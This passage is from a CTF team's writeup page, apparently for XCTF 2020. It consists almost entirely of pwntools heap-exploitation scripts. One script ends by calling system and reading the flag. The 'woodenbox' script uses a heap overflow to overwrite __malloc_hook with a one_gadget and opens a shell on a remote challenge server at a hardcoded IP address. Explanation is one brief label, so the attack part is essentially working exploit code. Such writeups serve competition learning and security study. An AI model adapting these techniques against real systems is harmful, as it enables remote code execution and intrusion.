class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x228</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x3f8</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x3f8</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'&amp;#92;0'</span>*<span class="number">0x88</span>+p64(<span class="number">0x91</span>)+p64(heap+<span class="number">0x9d0</span>)+p64(pbase+<span class="number">0x4010</span><span class="number">-0x10</span>))</span><br><span class="line">leave()</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x118</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x118</span>)</span><br><span class="line">fake = p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(pbase+<span class="number">0x40a0</span><span class="number">-0x18</span>)+p64(pbase+<span class="number">0x40a0</span><span class="number">-0x10</span>)</span><br><span class="line">fake = fake.ljust(<span class="number">0x110</span>,<span class="string">'&amp;#92;0'</span>)</span><br><span class="line">fake += p64(<span class="number">0x110</span>) + p64(<span class="number">0x120</span>)</span><br><span class="line">edit(<span class="number">0</span>,fake)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'&amp;#92;0'</span>*<span class="number">0x18</span>+p64(pbase+<span class="number">0x40b0</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x23333000</span>)+p64(<span class="number">0x100</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(pbase+<span class="number">0x1040</span>)+<span class="string">'&amp;#92;0'</span>*<span class="number">0x28</span>+p64(pbase+<span class="number">0x3F70</span>)+<span class="string">'&amp;#92;0'</span>*<span class="number">0x10</span>+<span class="string">'/bin/sh&amp;#92;0'</span>)</span><br><span class="line">back()</span><br><span class="line">libc = u64(ru(<span class="string">'&amp;#92;n'</span>)[:<span class="number">-1</span>]+<span class="string">'&amp;#92;0&amp;#92;0'</span>)</span><br><span class="line">base = libc - <span class="number">0x78880</span></span><br><span class="line">system = base + <span class="number">0x304e0</span></span><br><span class="line">edit(<span class="number">1</span>,p64(system)+<span class="string">'&amp;#92;0'</span>*<span class="number">0x28</span>+p64(<span class="number">0x23333048</span>))</span><br><span class="line">back()</span><br><span class="line">sl(<span class="string">'echo Ch4r1l3;cat flag;echo Ch4r1l3'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(heap))</span><br><span class="line">print(hex(libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="woodenbox"><a href="#woodenbox" class="headerlink" title="woodenbox"></a>woodenbox</h2><p>堆溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"ice:"</span>,str(c))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,c=<span class="string">"A"</span>)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    <span class="keyword">if</span>(size!=<span class="number">0</span>):</span><br><span class="line">            p.sendafter(<span class="string">":"</span>,c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,c=<span class="string">'A'</span>)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">libc=ELF(<span class="string">'./ecc'</span>)</span><br><span class="line"><span class="comment">#p=process('./pwn1',env=&#123;'LD_PRELOAD':"./ecc"&#125;)</span></span><br><span class="line">p=remote(<span class="string">"121.36.215.224"</span>,<span class="number">9998</span>)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x88</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x88</span>,<span class="string">"A"</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+<span class="string">'&amp;#92;xdd&amp;#92;x25'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">"A"</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+<span class="string">'&amp;#92;x80'</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"&amp;#92;x00"</span>*<span class="number">0x33</span>+p64(<span class="number">0x1802</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'&amp;#92;x00'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'')</span></span><br><span class="line">p.read(<span class="number">0x40</span>)</span><br><span class="line">base=u64(p.read(<span class="number">8</span>))-(<span class="number">0x7ffff7dd2600</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">log.warning(hex(base))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">libc.address=base</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">"&amp;#92;x00"</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-35</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">one=base+<span class="number">0xf02a4</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'&amp;#92;x00'</span>*<span class="number">19</span>+p64(one))</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive(<span class="string">'n132&gt;'</span>)</span><br></pre></td></tr></table></figure>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/ctf/">#ctf</a> <a href="/tags/re/">#re</a> <a href="/tags/web/">#web</a> <a href="/tags/crypto/">#crypto</a> <a href="/tags/pwn/">#pwn</a> <a href="/tags/misc/">#misc</a> <a href="/tags/writeup/">#writeup</a> <a href="/tags/xctf/">#xctf</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    De1ta-Team: De1iver the tea
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2099/05/22/Write-ups-for-CTFs/">Write ups for CTFs</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2020/03/10/XCTF<ZHANYI>-2020/">XCTF战疫 2020 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/19/SUCTF2019/">SUCTF 2019 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/08/de1ctf2019 Writeup/">De1ctf 2019 Writeup</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/De1ta-team">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="/atom.xml">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @De1ta-Team. All right reserved
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>